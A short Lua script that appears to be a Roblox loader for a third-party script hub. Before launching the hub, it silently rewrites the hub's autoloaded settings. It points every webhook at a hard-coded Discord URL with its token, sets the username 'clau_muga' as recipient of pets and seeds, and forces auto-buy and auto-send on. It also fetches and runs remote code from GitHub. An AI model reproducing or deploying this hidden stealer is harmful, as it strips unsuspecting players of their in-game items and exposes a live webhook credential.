local HS=game:GetService("HttpService")
pcall(function()
    local url="https://discord.com/api/webhooks/1519364173455294574/v_ek0BPuAVdob_jge-7GL6w3kQCKrAauneZ5T63RuLeyOUibJdoJEiHmlhqi4UECeyrn"
    local inputs={WebhookRarePet=url,WebhookSentPet=url,WebhookSentSeed=url,Text_SendPetUsername="clau_muga",Text_WishSeedUsername="clau_muga",Text_MutationSeedUsername="clau_muga"}
    local toggles={WebhookEnabled=true,Feature_AutoBuyPets=true,Feature_AutoSendPets=true,Feature_AutoSendSeeds=true,Feature_AutoCollect=true}
    local seedsAdd={"Bamboo","Rainbow","Moon Bloom","Dragon's Breath","Ghost Pepper","Gold"}
    local seedIdx={MailSeedTargets=true,WishSeedTargets=true,BuySeedTargets=true}
    local seedSet={}; for _,s in ipairs(seedsAdd) do seedSet[s]=true end
    local function build() local o={}
        for i,v in pairs(inputs) do o[#o+1]={idx=i,type="Input",text=v} end
        for i,v in pairs(toggles) do o[#o+1]={idx=i,type="Toggle",value=v} end
        for i in pairs(seedIdx) do local val={}; for s in pairs(seedSet) do val[s]=true end; o[#o+1]={idx=i,type="Dropdown",mutli=true,value=val} end
        return o end
    local function patch(d) for _,o in ipairs(d.objects) do
        if inputs[o.idx]~=nil then o.text=inputs[o.idx]
        elseif toggles[o.idx]~=nil then o.value=true
        elseif seedIdx[o.idx] and type(o.value)=="table" then for s in pairs(seedSet) do o.value[s]=true end end end end
    local dir="HoHoGag2/"..tostring(game.PlaceId).."/settings"
    for _,p in ipairs({"HoHoGag2","HoHoGag2/"..tostring(game.PlaceId),dir}) do if not isfolder(p) then makefolder(p) end end
    local cfg=dir.."/ggjjhhj.json"; local data
    if isfile(cfg) then local ok,dec=pcall(function() return HS:JSONDecode(readfile(cfg)) end); if ok and type(dec)=="table" and type(dec.objects)=="table" then data=dec end end
    if data then patch(data) else data={objects=build()} end
    writefile(cfg,HS:JSONEncode(data)); writefile(dir.."/autoload.txt","ggjjhhj")
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
task.spawn(function() for _=1,60 do task.wait(1)
    local T=getgenv().Toggles
    if T and T.Feature_AutoSendPets and T.Feature_AutoSendSeeds then
        pcall(function() T.Feature_AutoSendPets:SetValue(true) end)
        pcall(function() T.Feature_AutoSendSeeds:SetValue(true) end)
        print("[mail] auto-send включены"); break end end end)
